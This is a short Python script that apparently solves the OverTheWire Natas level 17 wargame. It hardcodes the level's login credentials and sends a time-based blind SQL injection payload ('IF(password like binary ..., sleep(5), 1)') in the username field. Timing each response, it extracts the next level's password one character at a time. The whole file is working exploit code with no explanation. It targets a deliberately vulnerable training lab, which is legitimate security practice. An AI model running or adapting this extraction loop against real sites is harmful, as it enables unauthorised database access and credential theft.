import requests
from requests.auth import HTTPBasicAuth

import string
import time
import base64

DELTA = 5

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

URL = "http://natas17.natas.labs.overthewire.org"
data ={'username':""}
headers = {'Authorization':'Basic {}'.format(base64.b64encode(f"{username}:{password}".encode()).decode())}


password = ""
password_length = 32

while len(password) < password_length:
    for c in string.digits + string.ascii_letters:
        payload = f"natas18\" and IF(password like binary '{password+c}%', sleep({DELTA}), 1)#"
        # print(c + " : " + payload)
        data['username'] = payload  
        before = time.time()
        response = requests.post(URL,data=data, headers=headers)
        after = time.time()
        if(after-before)> DELTA:
            password += c
            print("password: " + password.ljust(password_length, '*'))
            break

print("final:" +password)
